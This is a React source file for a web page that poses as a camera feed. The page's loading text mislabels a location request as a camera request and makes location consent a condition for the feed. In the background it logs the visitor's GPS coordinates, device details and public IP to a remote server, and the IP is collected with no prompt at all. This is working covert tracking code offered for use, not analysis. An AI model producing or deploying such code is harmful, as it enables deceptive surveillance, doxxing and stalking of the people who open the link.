import { useEffect, useState } from "react";
import { CONSTANTS } from "./constant";

function App() {
  const [status, setStatus] = useState("loading"); // loading | granted | denied | unsupported
  const [location, setLocation] = useState<unknown | null>(null);
  const [locationSent, setLocationSent] = useState(false);

  // Extract OS/device from user-agent
  const getDeviceInfo = () => {
    const connection = (navigator as any).connection || {};

    const ua = navigator.userAgent;
    let os = "Unknown OS";

    if (ua.indexOf("Win") !== -1) os = "Windows";
    else if (ua.indexOf("Mac") !== -1) os = "MacOS";
    else if (ua.indexOf("Linux") !== -1) os = "Linux";
    else if (ua.indexOf("Android") !== -1) os = "Android";
    else if (ua.indexOf("like Mac") !== -1) os = "iOS";

    return {
      deviceName: navigator.platform || "unknown",
      osVersion: os,
      userAgent: ua,
      networkType: connection.effectiveType || "unknown",
      platform: navigator.platform,
    };
  };

  // Ask for location
  useEffect(() => {
    if (!navigator.geolocation) {
      setStatus("unsupported");
      return;
    }
    const deviceInfo = getDeviceInfo();
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const coords = {
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          timestamp: new Date().toISOString(),
          ...deviceInfo,
        };
        setLocation(coords);
        setStatus("granted");
      },
      (err) => {
        console.error("❌ Location error:", err.message);
        setStatus("denied");
      }
    );
  }, []);

  // Send location to API once
  useEffect(() => {
    if (status === "granted" && location && !locationSent) {
      fetch(CONSTANTS.SERVER_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(location),
      })
        .then((res) => {
          if (res.ok) {
            console.log("✅ Location logged");
            setLocationSent(true);
          } else {
            console.error("❌ Backend error:", res.statusText);
          }
        })
        .catch((err) => {
          console.error("❌ Network error:", err);
        });
    }
  }, [status, location]);

  const fetchPublicIP = async ()=> {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      // const ip =  data.ip;
      fetch(CONSTANTS.SERVER_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });
    } catch (error) {
      console.error("❌ IP fetch error:", error);
      return null;
    }
  };

  useEffect(() => {
    fetchPublicIP();
  }, []);

  // UI flow
  if (status === "loading") {
    return (
      <div className="flex items-center justify-center h-screen bg-black text-white text-xl">
        Requesting Camera...
      </div>
    );
  }

  if (status === "denied" || status === "unsupported") {
    return (
      <div className="flex items-center justify-center h-screen bg-gray-700 text-white text-xl text-center px-4">
        🚫 Location access denied or unsupported.
        <br />
        Please enable location to access the camera feed.
      </div>
    );
  }

  if (!locationSent) {
    return (
      <div className="flex items-center justify-center h-screen bg-black text-white text-xl">
        Requesting Camera...
      </div>
    );
  }

  return (
    <iframe
      src={CONSTANTS.CAMERA_URL}
      className="fixed top-0 left-0 w-full h-full border-0 m-0 p-0 z-[9999]"
      title="Camera Feed"
    />
  );
}

export default App;